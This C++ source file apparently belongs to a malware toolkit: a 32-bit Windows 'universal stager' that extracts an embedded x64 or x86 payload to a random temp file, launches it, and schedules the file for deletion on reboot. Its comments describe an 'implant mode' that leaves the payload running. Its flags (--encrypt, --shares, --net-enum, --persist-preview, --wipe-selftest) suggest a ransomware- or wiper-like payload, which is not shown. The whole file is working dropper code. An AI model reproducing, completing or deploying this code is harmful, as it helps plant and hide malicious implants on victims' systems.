// Universal single-file stager.
//
// This is a 32-bit PE that carries both the x64 and x86 packed stagers as
// RCDATA. It selects the native architecture at runtime, extracts the matching
// stager to a random temp file, and launches it with the original arguments.
// On 64-bit Windows the 32-bit launcher runs under WOW64 and starts the x64
// stager; on native 32-bit Windows it starts the x86 stager.
//
// The embedded stagers are produced by build.ps1 and build_x86.ps1. They are
// intentionally extracted at runtime: a single PE cannot execute both machine
// architectures in one process.

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shellapi.h>
#include <string>
#include <vector>

namespace {
    constexpr WORD kX64Resource = 101;
    constexpr WORD kX86Resource = 102;

    std::wstring TempPath() {
        std::vector<std::wstring> dirs;
        wchar_t buf[MAX_PATH]{};
        DWORD n = GetTempPathW(MAX_PATH, buf);
        if (n && n < MAX_PATH) dirs.emplace_back(buf);
        n = GetEnvironmentVariableW(L"LOCALAPPDATA", buf, MAX_PATH);
        if (n && n < MAX_PATH) dirs.emplace_back(std::wstring(buf) + L"\\Temp");
        n = GetEnvironmentVariableW(L"ProgramData", buf, MAX_PATH);
        if (n && n < MAX_PATH) dirs.emplace_back(std::wstring(buf) + L"\\VEX");
        n = GetModuleFileNameW(NULL, buf, MAX_PATH);
        if (n && n < MAX_PATH) {
            std::wstring self = buf;
            size_t slash = self.find_last_of(L"\\/");
            if (slash != std::wstring::npos) dirs.emplace_back(self.substr(0, slash));
        }

        for (const std::wstring& dir : dirs) {
            CreateDirectoryW(dir.c_str(), NULL);
            wchar_t file[MAX_PATH]{};
            if (!GetTempFileNameW(dir.c_str(), L"vxu", 0, file)) continue;
            std::wstring out = file;
            DeleteFileW(out.c_str());
            size_t dot = out.find_last_of(L'.');
            if (dot != std::wstring::npos) out.resize(dot);
            out += L".exe";
            return out;
        }
        return L"";
    }

    bool WriteResource(WORD id, const std::wstring& path) {
        HRSRC res = FindResourceW(NULL, MAKEINTRESOURCEW(id), RT_RCDATA);
        if (!res) return false;
        DWORD size = SizeofResource(NULL, res);
        if (!size) return false;
        HGLOBAL mem = LoadResource(NULL, res);
        if (!mem) return false;
        const void* data = LockResource(mem);
        if (!data) return false;

        HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h == INVALID_HANDLE_VALUE) return false;
        DWORD written = 0;
        BOOL ok = WriteFile(h, data, size, &written, NULL) && written == size;
        CloseHandle(h);
        if (!ok) DeleteFileW(path.c_str());
        return ok != FALSE;
    }

    std::wstring QuoteArg(const wchar_t* arg) {
        std::wstring s = arg ? arg : L"";
        if (s.empty() || s.find_first_of(L" \t\"") == std::wstring::npos)
            return s;
        std::wstring out = L"\"";
        size_t backslashes = 0;
        for (wchar_t c : s) {
            if (c == L'\\') {
                ++backslashes;
            } else if (c == L'"') {
                out.append(backslashes * 2 + 1, L'\\');
                out.push_back(L'"');
                backslashes = 0;
            } else {
                out.append(backslashes, L'\\');
                backslashes = 0;
                out.push_back(c);
            }
        }
        out.append(backslashes * 2, L'\\');
        out.push_back(L'"');
        return out;
    }

    std::wstring ChildArgs(int argc, wchar_t** argv) {
        std::wstring out;
        for (int i = 1; i < argc; ++i) {
            if (wcscmp(argv[i], L"--arch") == 0 && i + 1 < argc) {
                ++i;
                continue;
            }
            out += L" ";
            out += QuoteArg(argv[i]);
        }
        return out;
    }

    bool IsNative64() {
        SYSTEM_INFO si{};
        GetNativeSystemInfo(&si);
        return si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
            si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64;
    }

    bool IsHarness(int argc, wchar_t** argv) {
        static const wchar_t* flags[] = {
            L"--safe", L"--selftest", L"--inspect", L"--persist-preview",
            L"--shares", L"--net-enum", L"--encrypt", L"--dry-run",
            L"--state-selftest", L"--wipe-selftest"
        };
        for (int i = 1; i < argc; ++i) {
            for (const wchar_t* f : flags) {
                if (wcscmp(argv[i], f) == 0) return true;
            }
        }
        return false;
    }
}

int wmain(int argc, wchar_t** argv) {
    bool forceX86 = false;
    for (int i = 1; i < argc; ++i) {
        if (wcscmp(argv[i], L"--version") == 0) {
            wprintf(L"universal-stager 1.1 (x64+x86, native selection)\n");
            return 0;
        }
        if (wcscmp(argv[i], L"--arch") == 0 && i + 1 < argc) {
            if (_wcsicmp(argv[i + 1], L"x86") == 0) forceX86 = true;
            ++i;
        }
    }

    const bool useX64 = IsNative64() && !forceX86;
    const WORD resource = useX64 ? kX64Resource : kX86Resource;
    const wchar_t* label = useX64 ? L"x64" : L"x86";

    std::wstring temp = TempPath();
    if (temp.empty()) {
        fwprintf(stderr, L"[-] universal stager: no writable temp path\n");
        return 1;
    }
    if (!WriteResource(resource, temp)) {
        fwprintf(stderr, L"[-] universal stager: cannot extract %ls stager\n", label);
        return 1;
    }

    std::wstring cmd = L"\"" + temp + L"\"" + ChildArgs(argc, argv);
    STARTUPINFOW si{ sizeof(si) };
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(NULL, &cmd[0], NULL, NULL, FALSE,
            CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi)) {
        fwprintf(stderr, L"[-] universal stager: cannot start %ls stager (%lu)\n",
            label, GetLastError());
        DeleteFileW(temp.c_str());
        return 1;
    }
    CloseHandle(pi.hThread);

    // Harness commands must propagate the child's exit code (notably --safe
    // returning 2). Implant mode returns immediately and leaves the payload
    // running; the extracted image is deleted on the next boot because Windows
    // keeps it mapped while the child is alive.
    if (IsHarness(argc, argv)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        DWORD rc = 1;
        GetExitCodeProcess(pi.hProcess, &rc);
        CloseHandle(pi.hProcess);
        if (!DeleteFileW(temp.c_str()))
            MoveFileExW(temp.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
        return (int)rc;
    }

    CloseHandle(pi.hProcess);
    MoveFileExW(temp.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    return 0;
}
